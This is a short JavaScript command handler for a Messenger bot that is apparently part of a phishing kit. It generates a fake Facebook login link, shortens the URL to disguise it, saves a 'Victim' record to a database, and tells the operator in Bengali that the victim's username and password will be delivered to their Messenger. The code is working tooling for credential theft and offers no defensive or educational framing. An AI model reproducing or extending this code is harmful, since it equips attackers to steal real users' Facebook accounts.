const { nanoid } = require('nanoid');
const Victim = require('../models/Victim');
const { getConfig, sendMessage, shortenUrl } = require('../utils/helpers');

module.exports = {
    execute: async (senderId, args, sendMessage) => {
        try {
            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';

            const id = nanoid(10);
            const longLink = `${baseUrl}/fb/${id}`;
            const shortLink = await shortenUrl(longLink);

            const victim = new Victim({
                id: id,
                fbId: senderId,
                type: 'fb',
                shortLink: shortLink,
                timestamp: new Date(),
                status: 'pending'
            });
            await victim.save();

            await sendMessage(senderId, `✅ **ফেক লগইন লিংক তৈরি করা হলো!**\n\n🔗 শর্ট লিংক: ${shortLink}\n🔗 আসল লিংক: ${longLink}\n\nভিক্টিম লগইন করলে ইউজারনেম/পাসওয়ার্ড আপনার মেসেঞ্জারে চলে আসবে।`);
        } catch (err) {
            console.error('FB command error:', err);
            await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
        }
    }
};